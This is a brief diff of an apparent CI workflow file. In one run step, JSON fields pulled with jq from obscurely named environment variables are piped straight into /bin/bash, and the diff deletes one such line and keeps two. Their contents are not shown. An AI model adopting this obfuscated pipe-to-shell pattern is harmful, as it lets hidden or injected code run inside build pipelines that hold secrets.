@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$o8" | jq -r .i0 | /bin/bash
           printf '%s' "$cd2" | jq -r .lghc5 | /bin/bash
-          echo $bi09267 | jq -r .ean2258 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
